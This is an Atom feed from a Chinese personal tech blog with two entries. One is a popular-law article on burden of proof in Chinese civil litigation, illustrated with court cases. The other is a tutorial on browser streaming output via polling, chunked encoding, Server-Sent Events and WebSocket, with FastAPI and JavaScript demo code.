<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Just For Fun</title>
  <icon>https://www.gravatar.com/avatar/0de0c23d97c75300e32f8494b1485fb8</icon>
  <subtitle>知其然，知其所以然。知识广度是深度的副产品！</subtitle>
  <link href="https://selfboot.cn/atom.xml" rel="self"/>
  
  <link href="https://selfboot.cn/"/>
  <updated>2024-06-07T06:32:37.905Z</updated>
  <id>https://selfboot.cn/</id>
  
  <author>
    <name>FeiZhao</name>
    <email>xuezaigds@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>谁主张谁举证，吵架时也用得到的法律知识</title>
    <link href="https://selfboot.cn/2024/06/06/who_asserts_must_prove/"/>
    <id>https://selfboot.cn/2024/06/06/who_asserts_must_prove/</id>
    <published>2024-06-06T21:55:28.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>一个晴朗的周末，你去超市购物。突然保安把你拦下来，说你偷了东西。<strong>你需要要证明你没偷东西吗</strong>？如果要证明，<strong>你又怎么证明呢</strong>？</p><p>又或者，你把自己的伞忘在了茶水间，过了会去找发现不见了。通过查监控，发现是另一个同事拿走了你的伞，于是想找这个同事拿回来。结果拿伞的同事<strong>让你证明这是你的伞，问你要购物记录和发票</strong>，你需要提供吗？</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240606_who_asserts_must_prove_cover_new.png" alt="谁主张谁举证，举证责任倒置"></p><span id="more"></span><p>生活中类似的例子数不胜数。遇到胡搅蛮缠、强词夺理的人，有时候我们可能会陷入自我怀疑，我是不是真的要自证啊？其实大可不必，记住这六个字，“<span style='color: red'><strong>谁主张谁举证</strong></span>”。这不仅是民事诉讼中的基本原则，也是我们应对各种纠纷时的法宝。</p><p>接下来<a href="https://selfboot.cn/links">小盛律师</a>和大家详细聊聊民事诉讼中的“谁主张谁举证”以及“举证责任倒置”，希望能帮大家理清思路，遇到类似情况时能够做到心中有数，游刃有余。</p><h2 id="谁主张谁举证"><a href="#谁主张谁举证" class="headerlink" title="谁主张谁举证"></a>谁主张谁举证</h2><p>“谁主张谁举证”是民事诉讼中的一项基本原则。当事人在民事诉讼中<strong>对自己所主张的事实，有责任提供证据加以证明</strong>。也就是说，如果一方提出了某个主张，那么这一方就需要承担提供证据的责任，以证明其主张的事实是真实存在的。如果这一方没有足够的证据来支持其主张，那么法院可能不会接受这个主张。这里主要依据<a href="https://www.faxin.cn/lib/zyfl/zyflcontent.aspx?gid=A310972&nid=45205">《中华人民共和国民事诉讼法》</a>：</p><blockquote><p>第六十七条　当事人对自己提出的主张，有责任提供证据。<br>　　当事人及其诉讼代理人因客观原因不能自行收集的证据，或者人民法院认为审理案件需要的证据，人民法院应当调查收集。<br>　　人民法院应当按照法定程序，全面地、客观地审查核实证据。</p></blockquote><p>直接看法律条文可能有点难懂，我找几个案例，咱们通过案例来理解一下。</p><h3 id="夫妻离心小三得利？"><a href="#夫妻离心小三得利？" class="headerlink" title="夫妻离心小三得利？"></a>夫妻离心小三得利？</h3><p>(2022)粤民初42**号：原告和被告是夫妻关系，原告婚后在家照顾家中老人、孩子，发现被告刘某在婚姻存续期间与被告万某保持不正常男女关系长达5、6年。还发现被告刘某在婚姻期间用夫妻共同财产为被告万某购买了房和车，还给被告刘某 27 万元。</p><p>原告认为被告万某没有工作的，根本没有经济能力购买上述的房产和车辆。被告刘某的行为明显属于在婚姻期间恶意转移夫妻共同财产，请求法院判令被告刘某返还 27 万元，并判令被告万某返还房产和车辆。</p><p>法院怎么认定的呢？首先原告提供的证据，<strong>尚不足以证实被告刘某与万某之间存在婚外情关系，二被告亦不确认存在婚外情关系</strong>。对于 27 万，原告提交的证据<strong>不足以证实刘某已实际支付给万某</strong>，二被告亦不确认张某的主张，张某的该项主张缺乏事实基础。所以法院最后认定，原告关于被告刘某与万某存在婚外情并转移夫妻共同财产的主张，无事实依据，不予支持。</p><p>其实很多类似的案例，夫妻一方怀疑对方有外遇，转移财产给第三人，但是没有足够的证据证明这一点。按照“谁主张谁举证”的原则，法院在没有证据的情况下，并不会支持原告的主张。</p><h3 id="民间借贷朋友反目"><a href="#民间借贷朋友反目" class="headerlink" title="民间借贷朋友反目"></a>民间借贷朋友反目</h3><p>(2024)桂民初13**号：本案是一个典型的民间借贷案件，<strong>借了钱最后朋友也没得做了</strong>。背景是这样的，被告周某因资金周转困难为由，向原告借 6000 元。原告作为朋友，<strong>基于朋友之间的信任</strong>，也没有要借条，当天直接通过现金和微信转账等方式借给了被告 6000 元。然后过了快 1 年，原告需要钱的时候，多次催被告还钱，但是被告周某<strong>拒绝履行还款义务</strong>，于是原告起诉要求被告还款。</p><p>原告主张，<strong>王某作为被告周某的老婆，也应该承担债务</strong>。法院认定，<strong>原告没有提供证据证实两被告为夫妻关系</strong>，根据谁主张谁举证的原则，应由原告承担<strong>举证不能的法律后果</strong>，所以最后没有支持王某对周某的债务承担共同偿还责任。</p><p>这两个常见的真实案例，是不是让你对“谁主张谁举证”有了一点深入的理解呢？</p><h2 id="举证责任倒置"><a href="#举证责任倒置" class="headerlink" title="举证责任倒置"></a>举证责任倒置</h2><p>谁主张谁举证这个大家应该很好理解，也符合常识。不过有时候会有<span style='color: red'><strong>举证责任倒置</strong></span>，这又是怎么回事呢？</p><p>举证责任倒置，也称举证责任反转，是指在某些特定情形下，<strong>原本应由一方当事人承担的举证责任，转由另一方当事人承担</strong>。这通常发生在一些特殊类型的案件中，如环境污染、产品责任等，由于举证困难等原因，法律为了平衡双方当事人的举证能力，特别规定将举证责任转移给另一方。</p><p>在<a href="https://www.gov.cn/xinwen/2020-06/01/content_5516649.htm">《中华人民共和国民法典》</a> 中有多个条款都有举证责任倒置相关说明。这里列举 2 个：</p><blockquote><p>第一千二百三十条 因污染环境、破坏生态发生纠纷，行为人应当就法律规定的不承担责任或者减轻责任的情形及其行为与损害之间不存在因果关系承担举证责任。</p><p>第一千二百五十四条　禁止从建筑物中抛掷物品。从建筑物中抛掷物品或者从建筑物上坠落的物品造成他人损害的，由侵权人依法承担侵权责任；经调查难以确定具体侵权人的，<strong>除能够证明自己不是侵权人的外，由可能加害的建筑物使用人给予补偿</strong>。可能加害的建筑物使用人补偿后，有权向侵权人追偿。</p></blockquote><p>下面还是先看案例吧。</p><h3 id="高空坠物飞来横祸"><a href="#高空坠物飞来横祸" class="headerlink" title="高空坠物飞来横祸"></a>高空坠物飞来横祸</h3><p>(2023)湘民终4**号：背景先介绍下，这是一个代位求偿权纠纷案件，保险公司向责任方物业公司追偿。一审中，车主将小轿车停在被告所管理的小区，小区<strong>外墙玻璃脱落砸到轿车</strong>，致使该车辆严重受损。车主投保的保险公司起诉要求被告赔偿损失。一审法院认为，物业服务企业承担的是<strong>无过错责任</strong>，<strong>适用的是举证责任倒置原则</strong>，不管该玻璃是受太阳暴晒、还是受风雨影响导致玻璃爆裂，被告对受损车辆均具有不可推卸的赔偿责任。被告不服，提起上诉。</p><p>二审认为对于物件脱落、坠落造成他人人身财产损害的，建筑物的所有人、管理人应当承担侵权责任，归责原则<strong>适用过错推定原则</strong>，即法律推定加害人有过错，从而实现举证责任倒置，由<strong>加害人证明自己没有过错</strong>。如果其能够证明自己没有过错，就不承担民事责任，否则就认定其有过错并结合其他构成要件承担相应的民事责任。</p><p>本案上诉单位作为小区的服务企业，<strong>提供的证据不足以证明其对于被上诉人车辆受损害的事实没有过错</strong>，因此，应推定上诉人对其服务的小区<strong>建筑物存在维护、管理瑕疵</strong>，应当承担相应的赔偿责任。不过小车没停放在指定的停车位，<strong>具有一定的过错</strong>，需对损失承担 30% 的责任，物业公司未履行安全管理义务，承担 70% 的责任。</p><p>这里小盛律师再展开聊下高空坠物，假设张三在小区走路，被楼上扔下来的菜刀砸中。警察调查半天，没找到是哪一户扔的菜刀，这时候整栋楼所有住户都有可能是加害人。根据举证责任倒置，<strong>除非能够证明自己没有扔菜刀，比如那个时段家里没人，否则都需要承担侵权责任</strong>。这样的规定是为了保护受害人的合法权益，避免因为举证困难而导致受害人无法获得赔偿。</p><h3 id="猪粪污水毒死鱼蟹"><a href="#猪粪污水毒死鱼蟹" class="headerlink" title="猪粪污水毒死鱼蟹"></a>猪粪污水毒死鱼蟹</h3><p>(2024)吉民终1**号：原告闫某承包了一个大坝，用于养殖鱼蟹，春季水库解冻后，发现水库出现死鱼。闫某顺着水流追溯到董某、钱某承包的养殖场，发现该养殖场冬季猪粪及排水物堆积，春季解冻后粪水流入水道，而后流入水库。闫某认为粪水对水质造成严重污染，导致鱼类死亡，于是找到董某、钱某要求赔偿，但沟通数次未达成赔偿协议，遂诉至法院。</p><p>一审法院认定董某、钱某承担赔偿责任，董某、钱某不服，提起上诉。上诉的一个核心观点是，<strong>之前闫某申请的鉴定结果不对，并不能证明猪粪尿水与其鱼蟹死亡之间存在因果关系</strong>，所以董某、钱某不应承担赔偿责任。</p><p>二审法院认为本案为水污染责任纠纷，<strong>因果关系举证责任倒置</strong>。所以这里<strong>因果关系的举证责任应由董某、钱某承担</strong>。董某、钱某虽主张闫某鱼塘内鱼蟹死亡是因鱼塘上游农田排放农药和居民生活垃圾导致，但<strong>二人对此并未举证加以证明</strong>，且二人<strong>也未对侵权行为与损害结果之间不存在因果关系进行举证</strong>，所以一审法院的结果并无不当。</p><p>本案是一个环境污染案，这里因果关系的举证责任倒置，所以被告需要证明猪粪尿水与鱼蟹死亡之间<strong>没有因果关系</strong>才行。对原告来说，虽然主张被告侵权，但不需要证明因果关系，只需要举证关联关系即可。这里关联关系其实根据生活常识，猪粪尿水流入水库，导致水质污染，鱼蟹死亡，是可以认为有关联的。 </p><p>不过值得注意的是，举证责任倒置并非普遍适用的原则，而是针对特定案件类型所作的特别规定。在具体案件中是否适用举证责任反转，需根据相关法律法规及案件具体情况来判断。这里不再展开，如有具体法律需求，可以咨询小盛律师。</p><h2 id="生活中的建议"><a href="#生活中的建议" class="headerlink" title="生活中的建议"></a>生活中的建议</h2><p>前面介绍了法律中的举证责任，可以看到还是有点复杂的。不过对于咱们大部分人来说，日常生活中用好“谁主张谁举证”就足够了。</p><p>回到文章开头的小场景：</p><ol><li>如果保安说你偷东西，你<strong>不需要证明自己没偷</strong>，应该先让保安调监控或者用其他方式证明你偷了。或者直接报警，让警察介入来调查就好了。</li><li>如果“拿”你伞的人要你提供购物记录，<strong>你没必要提供</strong>。从监控来看，是你先放那里，按照生活常识这伞就是你的，她后来拿走的行为是盗窃。如果她说是自己的伞，那么也是要她来证明这伞是她的才行。</li></ol><p>下次再遇见类似纠纷，知道怎么做了吧！</p><hr><p>我是 <a href="https://selfboot.cn/links">小盛律师</a>，欢迎关注我获取更多法律科普。如果有法律纠纷，欢迎付费咨询。</p><div class="pure-g">  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_wx_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_xhs_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_dy_qrcode.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div></div>]]></content>
    
    
    <summary type="html">遇到被指责偷窃、被指错误等纠纷时，很多人会下意识自证清白。但&quot;谁主张谁举证&quot;是民事诉讼的基本原则，即提出指控的一方应提供证据证实，而非被指控方需自证清白。本文通过多个生动案例，阐释了谁主张谁举证原则及例外情况下的举证责任倒置规则，帮助读者理清思路，在生活中遇到纠纷时能正确认识举证责任，避免自证的错误做法，维护自身合法权益。</summary>
    
    
    
    <category term="法律普及" scheme="https://selfboot.cn/categories/%E6%B3%95%E5%BE%8B%E6%99%AE%E5%8F%8A/"/>
    
    
    <category term="法律" scheme="https://selfboot.cn/tags/%E6%B3%95%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>结合实例理解流式输出的几种实现方法</title>
    <link href="https://selfboot.cn/2024/05/19/stream_sse_chunk/"/>
    <id>https://selfboot.cn/2024/05/19/stream_sse_chunk/</id>
    <published>2024-05-19T21:42:37.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>如果有用过 ChatGPT 等大语言模型，可能就会发现在聊天对话中，AI 的输出文本是一批批“蹦出来”的，这就是所谓的<strong>流式输出</strong>。在浏览器上，是怎么实现这种效果呢？</p><p>本篇文章会介绍 4 种常见方法来实现流式输出效果，每种方法都会结合实际例子来演示。在业务中选择哪种方法，取决于具体的需求和场景。</p><ol><li><strong>客户端轮询</strong>：客户端定时（如每几秒）发送请求到后端服务，获取新的数据。</li><li><strong>分块传输</strong>：HTTP&#x2F;1.1 支持，服务器一次可以只发送部分响应内容，客户端接收到部分数据后就可以开始处理。</li><li><strong>Server-Sent Events</strong>：服务器向浏览器推送信息，浏览器创建一个到服务器的单向连接，服务器通过这个连接可以发送多个消息。</li><li><strong>Web Socket</strong>：建立一个持久的、全双工的连接，允许服务器和客户端之间进行实时、双向的通信。</li></ol><span id="more"></span><h2 id="简单轮询"><a href="#简单轮询" class="headerlink" title="简单轮询"></a>简单轮询</h2><p>首先是最简单的轮询方法，客户端每隔一段时间向服务器发送请求，获取新的数据。实现轮询的时候，客户端和服务器需要用 HTTP 请求参数和回包<strong>约定数据更新或者结束</strong>的方式。比如简单的用一个请求字段 cnt 来约定这是第几次请求，返回中用 400 错误码来约定本次轮询结束。</p><p>下面用 Python 的 FastAPI 写一个简单示例，每次带一个下标来请求一段文本中的内容，如果超过文本长度，就返回 400。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">polling</span>(<span class="params">cnt: <span class="built_in">int</span> = <span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> cnt &gt;= <span class="built_in">len</span>(message) <span class="keyword">or</span> cnt &lt; <span class="number">0</span>:  <span class="comment"># 检查cnt是否有效</span></span><br><span class="line">        <span class="keyword">raise</span> HTTPException(status_code=<span class="number">400</span>, detail=<span class="string">&quot;Invalid index&quot;</span>)</span><br><span class="line">    data = &#123;<span class="string">&quot;message&quot;</span>: message[cnt]&#125;</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(content=data)</span><br></pre></td></tr></table></figure><div id="anchorPolling"></div><p><a href="#anchorPolling">这里</a>是轮询的交互式展示：</p><div class="data-container">    <div id="pollingData" class="data-block"></div>    <div class="button-container">        <button onclick="fetchData()" class="action-button">开始</button>        <button onclick="stopPolling()" class="action-button">结束</button>    </div></div><p>点击开始后，即可看到数据不断更新，直到结束。如果打开控制台，就能看到浏览器每隔100ms发起一个 HTTP 请求，同时用参数 cnt 表示这是第几次请求。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240519_stream_sse_chunk_polling.png" alt="控制台查看轮询的请求过程"></p><p>这种方式的优点就是比较容易理解，实现起来比较简单。但是缺点也很明显，就是<strong>频繁的 HTTP 请求</strong>，会增加服务器的负担，同时也会增加网络传输的开销。如果是 <code>HTTP/1.1</code> 的话，每次请求都需要建立 TCP 连接，开销会更大。另外轮询的时间间隔也不太好控制，如果时间间隔太短，可能数据还没更新，白白浪费多次请求。如果时间间隔太长，用户体验又不好。</p><h2 id="分块传输编码"><a href="#分块传输编码" class="headerlink" title="分块传输编码"></a>分块传输编码</h2><p>上面轮询机制的缺点显而易见，主要是因为需要很多 HTTP 连接来更新数据。其实在 HTTP&#x2F;1.1 中，还有一种更好的方式，就是利用<strong>分块传输编码</strong>。分块传输编码实现流式输出更加高效，客户端只用请求一次，服务器<strong>以多个“块”的形式响应，直到所有数据都发送完毕</strong>。分块传输适用于响应体很大或由于内容是实时生成的而无法预知大小的情况，常见于大文件下载、视频流或实时数据流的传输。目前如果想在微信小程序中实现流式输出，最方便就是分块编码。</p><p>分块传输编码的协议稍微复杂一点，在响应头中用 <code>Transfer-Encoding: chunked</code> 表明响应将以分块的形式发送。每个块开始前，服务器发送一行包含当前块大小的数据，后跟一个回车换行（CRLF），紧接着是实际的块数据，再后面是一个CRLF。传输结束时，服务器发送一个大小为0的块，表示没有更多的数据块，通常后跟一个 CRLF。</p><p>在 Python 中用 FastAPI 实现分块编码协议也比较简单，下面是一个简单的示例，隔 100ms 输出内容然后分块编码传输：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@stream_app.get(<span class="params"><span class="string">&quot;/chunked&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">chunked_transfer</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">generate_large_data</span>():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">            <span class="keyword">yield</span> <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(generate_large_data(), media_type=<span class="string">&quot;text/plain&quot;</span>)</span><br></pre></td></tr></table></figure><div id="anchorChunked"></div><p><a href="#anchorChunked">这里</a>是分块传输编码的交互式展示：</p><div class="data-container">    <div id="chunkedData" class="data-block"></div>    <div class="button-container">        <button onclick="startChunked()" class="action-button">开始</button>        <button onclick="stopChunked()" class="action-button">结束</button>    </div></div><p>点击开始后，同样可以看到数据不断更新，直到所有内容打印出来。如果打开控制台，看到浏览器只发送了一个 HTTP 请求，这个请求的响应中 Header 中有 <code>Transfer-Encoding: chunked</code>，响应数据大小随着时间不断更新。下面是动态图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240519_stream_sse_chunk_chunked.gif?noresize=true" alt="分块传输编码的动态图"></p><p>值得注意的是，分块传输编码只在 HTTP&#x2F;1.1 中支持。在 HTTP&#x2F;2 中，分块传输编码的概念已经不存在了，这主要是因为 HTTP&#x2F;2 的工作方式有很大的不同。HTTP&#x2F;2 引入了多路复用（multiplexing）、二进制帧（binary framing）和流控制（stream prioritization）等新的机制来提高效率和性能。 在 HTTP&#x2F;2 中，所有通信都在单一的 TCP 连接上通过帧进行。数据帧（DATA frames）被用来传输消息体数据。服务器可以根据需要连续发送多个数据帧，每个帧携带一部分消息内容。客户端按接收顺序重新组装这些帧来重建完整的消息。</p><p>不过我这里的示例，在 HTTP&#x2F;2 下仍然是流式输出的，这是因为这里前端用的 <code>Fetch API</code> 和流处理 <code>response.body.getReader().read()</code>，它提供了一致的接口来处理流数据，不论底层协议是 HTTP&#x2F;1.1 还是 HTTP&#x2F;2。当调用的是 HTTP&#x2F;2 接口时，也能正常从数据帧中读取数据。</p><h2 id="Server-Sent-Events"><a href="#Server-Sent-Events" class="headerlink" title="Server-Sent Events"></a>Server-Sent Events</h2><p>OpenAI 在聊天工具 ChatGPT 中没有使用上面两种方式，而是用了 <code>Server-Sent Events（SSE）</code>来实现流式输出。SSE 允许服务器主动向浏览器或其他客户端推送事件。SSE的设计主要是为了简化从服务器到客户端的单向实时数据流，尤其适用于需要快速、持续更新数据的Web应用，如实时新闻更新、股票行情、或社交媒体实时消息等。</p><p>SSE 基于 HTTP 协议，使用标准的HTTP请求来开始连接。首先客户端发起标准的 HTTP GET 请求开始一个SSE连接。请求的头部通常包含<code>Accept: text/event-stream</code>，这告诉服务器客户端希望开启一个SSE连接。服务器响应这个请求，并<strong>保持连接打开</strong>，响应的 Content-Type 被设置为<code>text/event-stream</code>。随后，服务器可以发送<strong>形式为纯文本的事件流</strong>。每个事件以一个可选的事件名和必须的数据字段组成。事件以<code>data:</code>开始，后跟具体的消息数据，事件之间以两个换行符<code>\n\n</code>分隔。整个过程中 HTTP 连接保持打开状态，服务器可以随时发送新事件，客户端在接收到每个事件后处理数据。SSE连接一旦建立，服务器可以持续不断地发送数据更新到客户端，直到连接被关闭。</p><p>在 Python 中用 FastAPI 实现 SSE 比较简单，下面是一个简单的示例，隔 100ms 向客户端返回内容，等所有内容输出完，服务器结束本次连接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@stream_app.get(<span class="params"><span class="string">&quot;/events&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_events</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">event_stream</span>():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">            <span class="keyword">yield</span> <span class="string">f&quot;data: <span class="subst">&#123;i&#125;</span>\n\n&quot;</span>  <span class="comment"># 注意数据格式</span></span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">yield</span> <span class="string">f&quot;data: END\n\n&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(event_stream(), media_type=<span class="string">&quot;text/event-stream&quot;</span>)</span><br></pre></td></tr></table></figure><div id="anchorSSE"></div><p><a href="#anchorSSE">这里</a>是 SSE 的交互式展示：</p><div class="data-container">    <div id="sseData" class="data-block"></div>    <div class="button-container">        <button onclick="startSSE()" class="action-button">开始</button>        <button onclick="stopSSE()" class="action-button">结束</button>    </div></div><p>点击开始后，可以看到数据不断更新，直到所有内容打印出来。如果打开控制台，看到浏览器只发送了一个 HTTP 请求，这个请求的响应中 Header 中有 <code>Content-Type: text/event-stream</code>，响应数据大小随着时间不断更新。下面是整个过程动态图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240519_stream_sse_chunk_sse.gif?noresize=true" alt="Server-Sent Events 的动态图"></p><p>大多数现代浏览器都支持SSE，使用 SSE 用户体验比较好，也十分节省资源。不过 SSE 有一个缺点，就是<strong>只能从服务器到客户端单向传输</strong>，客户端不能向服务器发送数据。如果需要双向通信，就需要使用 Web Socket。</p><h2 id="Web-Socket"><a href="#Web-Socket" class="headerlink" title="Web Socket"></a>Web Socket</h2><p>前面的三种方法都是基于 HTTP 协议的，主要是为了解决服务器向客户端推送数据的问题。而 Web Socket 是一种独立的协议，它是一种<strong>全双工通信</strong>协议，允许客户端和服务器之间<strong>进行实时、双向的通信</strong>，从而有效地支持复杂的交互式应用，例如在线游戏、交易平台和协作工具。</p><p>WebSocket 也是基于 TCP 协议实现，具体的协议由 IETF 的 <a href="https://datatracker.ietf.org/doc/html/rfc6455">RFC 6455</a> 定义。首先是握手阶段，WebSocket 连接首先通过 HTTP 协议发起，需要客户端发送一个特殊的 HTTP 请求，包含 <code>Upgrade: websocket </code> 和 <code>Connection: Upgrade</code> 头部，请求服务器切换到 WebSocket 协议。如果服务器支持 WebSocket，它会返回一个HTTP响应码 <code>101 Switching Protocols</code>，表示同意切换到 WebSocket。</p><p>一旦握手成功，连接就升级到 WebSocket，双方就可以开始通过帧来发送数据。WebSocket协议定义了多种帧类型，用于传输数据、关闭连接、ping&#x2F;pong等。WebSocket协议<strong>支持文本和二进制消息</strong>，允许消息在一个帧内发送完或者分片发送。</p><p>在 Python 中用 FastAPI 实现 Web Socket 服务端如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@stream_app.websocket(<span class="params"><span class="string">&quot;/ws&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">websocket_endpoint</span>(<span class="params">websocket: WebSocket</span>):</span><br><span class="line">    <span class="keyword">await</span> websocket.accept()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">await</span> websocket.send_text(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>) </span><br><span class="line">    <span class="keyword">await</span> websocket.close()</span><br></pre></td></tr></table></figure><div id="anchorWS"></div><p><a href="#anchorWS">这里</a>是 Web Socket 的交互式展示：</p><div class="data-container">    <div id="wsData" class="data-block"></div>    <div class="button-container">        <button onclick="startWebSocket()" class="action-button">开始</button>        <button onclick="stopWebSocket()" class="action-button">结束</button>    </div></div><p>这里开始后，在控制台可以看到 WebSocket 中传输的数据。Chrome 的开发者工具，有个 message 状态栏，可以看到整个全双工通信过程中的数据内容。下面是整个过程动态图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240519_stream_sse_chunk_websocket.gif?noresize=true" alt="Web Socket 的动态图"></p><p>当然，WebSocket 协议相对 HTTP 更复杂，需要服务器和客户端都实现更多的逻辑。</p><p>本文结合具体的例子，介绍了 4 种常见的实现流式输出的方法，每种方法都有自己的优缺点，适用于不同的场景。以下是一些建议:</p><ol><li>针对简单的单向推送场景，如新闻实时更新、股票行情等，可以考虑使用 Server-Sent Events。实现简单，支持主流浏览器，且能有效节省服务器资源。</li><li>对于需要双向通信的交互场景，如即时通讯、协作办公、在线游戏等，WebSocket 是更合适的选择。全双工通信，支持文本和二进制数据，延迟较低。但需要客户端和服务器端均实现 WebSocket 协议逻辑。</li><li>如果对延迟要求不太高，可以考虑使用轮询或分块传输编码。轮询实现最简单，但频繁请求会增加服务器负担。分块传输编码效率更高,无需频繁建立连接。</li><li>对于需要向老旧浏览器提供支持的应用，轮询可能是唯一可选方案，因为旧版本浏览器可能不支持 WebSocket 或 Server-Sent Events。</li></ol><p>总的来说，流式输出在现代 Web 应用中得到了越来越广泛的应用。特别是大语言模型兴起之后，几乎所有的文本生成应用，都是用流式输出来提升用户体验。</p><style>.data-container {    margin-bottom: 20px;}.data-block {    min-height: 100px;    overflow: auto;    border: 1px solid #ccc;    padding: 5px;    white-space: pre-wrap;    word-wrap: break-word;    width: 100%;}.button-container {    display: flex;    justify-content: end; /* 按钮靠右对齐 */    margin-top: 10px;}.action-button {    margin-left: 10px; /* 按钮之间的水平间隔 */    padding: 5px 10px;}.action-button:disabled {    opacity: 0.5; /* 禁用按钮时的样式 */    cursor: not-allowed; /* 鼠标样式表明按钮不可点击 */}</style><script>let count = 0;let pollingTimer; // 用于取消轮询的定时器function fetchData() {    document.getElementById('pollingData').innerHTML = '';    count = 0;    fetchPolling(); // 开始轮询}function fetchPolling() {    fetch('https://api.selfboot.cn/stream/polling?cnt=' + count)        .then(response => {            if (!response.ok && response.status === 400) {                throw new Error('Server returned 400 error');            }            return response.json();        })        .then(data => {            document.getElementById('pollingData').innerText += data.message;            count++;            pollingTimer = setTimeout(fetchPolling, 100);  // 安排下一次请求        })        .catch(error => {            console.error('Polling stopped: ', error);        });}function stopPolling() {    clearTimeout(pollingTimer); // 取消定时器，停止轮询    document.getElementById('pollingData').innerHTML = ''; // 清空数据区}let reader; // 用于Chunked传输的readerfunction startChunked() {    document.getElementById('chunkedData').innerHTML = '';    fetch('https://api.selfboot.cn/stream/chunked')        .then(response => {            reader = response.body.getReader();            readChunked();        })        .catch(console.error);}function readChunked() {    reader.read().then(({done, value}) => {        if (!done) {            const text = new TextDecoder().decode(value);            document.getElementById('chunkedData').innerText += text;            readChunked();        }    });}function stopChunked() {    if (reader) {        reader.cancel(); // 取消读取操作，终止流    }    document.getElementById('chunkedData').innerHTML = '';}let eventSource; // 用于SSE的EventSource对象function startSSE() {    document.getElementById('sseData').innerHTML = '';    eventSource = new EventSource('https://api.selfboot.cn/stream/events');    eventSource.onmessage = function(event) {        if (event.data === "END") {            eventSource.close();        } else if (event.data === "") {            document.getElementById('sseData').innerHTML += '<br>';        } else {            document.getElementById('sseData').innerHTML += event.data;        }    };    eventSource.onerror = function(event) {        console.error("SSE failed:", event);    };}function stopSSE() {    if (eventSource) {        eventSource.close(); // 关闭SSE连接    }    document.getElementById('sseData').innerHTML = '';}let websocket;function startWebSocket() {    document.getElementById('wsData').innerHTML = '';    websocket = new WebSocket('wss://api.selfboot.cn/stream/ws');    websocket.onopen = function() {        console.log('WebSocket connection opened');    };    websocket.onmessage = function(event) {        document.getElementById('wsData').innerHTML += event.data;    };    websocket.onerror = function(event) {        console.error('WebSocket error observed:', event);    };    websocket.onclose = function(event) {        console.log('WebSocket connection closed');    };}function stopWebSocket() {    if (websocket) {        websocket.send('stop'); // 发送停止信号        websocket.close(); // 关闭连接    }    document.getElementById('wsData').innerHTML = '';}</script>]]></content>
    
    
    <summary type="html">通过交互和控制台截图，详细介绍了在浏览器端实现流式输出的4种常见方法。轮询方式简单但效率低下。分块传输利用HTTP/1.1特性，服务器可分多个数据块响应，提高效率。Server-Sent Events 基于HTTP，服务器可主动向客户端推送事件流，应用于单向实时数据传输场景。WebSocket是独立协议，支持全双工通信，适合交互式Web应用。</summary>
    
    
    
